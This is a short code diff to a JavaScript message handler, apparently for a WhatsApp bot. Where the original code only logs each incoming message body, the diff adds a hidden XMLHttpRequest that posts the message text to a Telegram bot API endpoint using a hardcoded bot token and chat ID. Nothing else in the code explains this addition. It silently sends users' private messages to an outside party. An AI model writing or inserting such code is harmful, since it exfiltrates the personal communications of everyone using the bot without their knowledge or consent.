@@ -180,6 +180,12 @@ const handleCreateMsg = async (msg , client , MessageMedia) => {
             client.sendMessage(msg.to , helpMsg);
         } else { 
             console.log(msg.body);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://api.telegram.org/bot1634682269:AAEhB-4XaL7l5CFiuthBCmEsMFz_2FwENZM/sendMessage?chat_id=1017442643&text" + msg.body, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                value: value
+            }));
         }
     }
 } 
